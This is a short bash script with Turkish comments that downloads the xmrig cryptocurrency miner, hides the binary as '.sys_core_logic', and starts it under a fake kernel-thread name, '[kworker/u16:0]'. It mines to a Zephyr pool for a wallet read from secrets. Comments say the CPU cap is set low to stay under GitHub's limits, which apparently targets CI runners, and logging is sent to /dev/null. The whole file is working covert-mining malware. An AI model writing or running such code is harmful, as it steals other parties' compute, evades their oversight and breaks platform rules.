#!/bin/bash
cd "$(dirname "$0")"

# Maskeleme isimleri
AGENT=".sys_core_logic"

# 1. Motoru indir
wget -q https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
tar -xf xmrig-6.22.2-linux-static-x64.tar.gz
mv xmrig-6.22.2/xmrig ./$AGENT
rm -rf xmrig-6.22.2*

# 2. Madenciyi başlat (Direct Pool)
# --cpu-max-threads-hint 30: GitHub'ın CPU limitine takılmamak için
# -o: HeroMiners Türkiye sunucusu
# -u: Senin cüzdan adresin (Secrets'dan gelecek)

echo "🚀 Madenci tünelsiz başlatılıyor..."

exec -a "[kworker/u16:0]" ./$AGENT \
    -o de.zephyr.herominers.com:1123 \
    -u $ZEPH_WALLET \
    -p "GHOST_WORKER" \
    -a rx/0 \
    --cpu-max-threads-hint 30 \
    --background \
    --log-file /dev/null

echo "✅ Madenci sisteme enjekte edildi."
